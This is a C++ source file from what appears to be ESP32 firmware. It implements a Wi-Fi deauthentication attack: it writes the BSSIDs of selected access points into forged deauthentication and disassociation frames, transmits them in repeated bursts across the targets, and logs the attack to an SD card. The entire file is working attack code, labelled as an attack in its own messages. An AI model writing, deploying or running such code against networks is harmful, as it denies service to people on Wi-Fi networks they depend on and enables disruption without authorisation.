/*
 * This firmware is under MIT License
 * Author: Abdullah Ali
 */
#include "deauth.h"
#include "scanner.h"
#include "sdcard.h"
#include <WiFi.h>
#include "esp_wifi.h"

bool deauthRunning = false;
uint32_t deauthPacketsSent = 0;
unsigned long deauthStartTime = 0;

static int targetIndices[MAX_APS];
static int targetCount = 0;
static int currentTargetIdx = 0;

static uint32_t ppsLastCount = 0;
static unsigned long ppsLastTime = 0;
static float currentPPS = 0;

void deauth_init() {
}

void deauth_start() {
  targetCount = 0;
  for (int i = 0; i < scannedAPCount && targetCount < MAX_APS; i++) {
    if (scannedAPs[i].selected) {
      targetIndices[targetCount++] = i;
    }
  }

  if (targetCount == 0) {
    Serial.println("[DEAUTH] No targets selected");
    return;
  }

  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(200);

  deauthPacketsSent = 0;
  deauthStartTime = millis();
  currentTargetIdx = 0;
  ppsLastCount = 0;
  ppsLastTime = millis();
  currentPPS = 0;
  deauthRunning = true;

  String logEntry = sdcard_getTimestamp() + " DEAUTH_START targets=" + String(targetCount);
  for (int i = 0; i < targetCount; i++) {
    logEntry += " " + String(scannedAPs[targetIndices[i]].ssid);
  }
  sdcard_appendLog(DEAUTH_LOG, logEntry);

  Serial.printf("[DEAUTH] Started attack on %d targets\n", targetCount);
}

void deauth_stop() {
  deauthRunning = false;

  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(200);

  String logEntry = sdcard_getTimestamp() + " DEAUTH_STOP pkts=" + String(deauthPacketsSent);
  sdcard_appendLog(DEAUTH_LOG, logEntry);

  Serial.printf("[DEAUTH] Stopped. Total packets: %u\n", deauthPacketsSent);
}

int deauth_sendBurst() {
  if (!deauthRunning || targetCount == 0) return 0;

  int sent = 0;
  APInfo& target = scannedAPs[targetIndices[currentTargetIdx]];

  esp_wifi_set_channel(target.channel, WIFI_SECOND_CHAN_NONE);

  // Patch target BSSID at offsets 10 (Source) and 16 (BSSID); destination stays broadcast
  memcpy(&deauthFrame[10], target.bssid, 6);
  memcpy(&deauthFrame[16], target.bssid, 6);

  memcpy(&disassocFrame[10], target.bssid, 6);
  memcpy(&disassocFrame[16], target.bssid, 6);

  for (int i = 0; i < 10; i++) {
    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, sizeof(deauthFrame), false);
    if (err == ESP_OK) sent++;
  }

  for (int i = 0; i < 5; i++) {
    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, disassocFrame, sizeof(disassocFrame), false);
    if (err == ESP_OK) sent++;
  }

  deauthPacketsSent += sent;
  currentTargetIdx = (currentTargetIdx + 1) % targetCount;

  unsigned long now = millis();
  if (now - ppsLastTime >= 1000) {
    currentPPS = (float)(deauthPacketsSent - ppsLastCount) * 1000.0f / (float)(now - ppsLastTime);
    ppsLastCount = deauthPacketsSent;
    ppsLastTime = now;
  }

  return sent;
}

const char* deauth_getCurrentTarget() {
  if (targetCount == 0) return "None";
  return scannedAPs[targetIndices[currentTargetIdx]].ssid;
}

float deauth_getPPS() {
  return currentPPS;
}
